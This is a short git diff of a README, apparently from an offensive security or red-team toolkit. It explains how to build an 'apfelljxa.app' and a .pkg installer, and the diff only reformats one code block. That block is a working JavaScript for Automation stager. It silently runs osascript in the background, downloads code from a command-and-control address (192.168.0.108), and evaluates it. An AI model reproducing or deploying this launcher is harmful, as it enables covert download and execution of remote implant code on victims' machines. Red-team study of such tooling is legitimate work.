@@ -14,9 +14,9 @@ Run to build pkg:
 
 ## Creating apfelljxa.app with Script Editor
 Create apfelljxa.app with the following Javascript:  
-`var app = Application.currentApplication();
-app.includeStandardAdditions = true;
-app.doShellScript("osascript -l JavaScript -e \"eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('http://192.168.0.108:80/api/v1.4/files/download/8e3e832d-ffc1-416a-8d77-f578759e0c69')), $.NSUTF8StringEncoding)));\" &>/dev/null &");`
+`var app = Application.currentApplication();`
+`app.includeStandardAdditions = true;`
+`app.doShellScript("osascript -l JavaScript -e \"eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('http://192.168.0.108:80/api/v1.4/files/download/8e3e832d-ffc1-416a-8d77-f578759e0c69')), $.NSUTF8StringEncoding)));\" &>/dev/null &");`
 
 
 Note: Exclude Example folder when building the .pkg
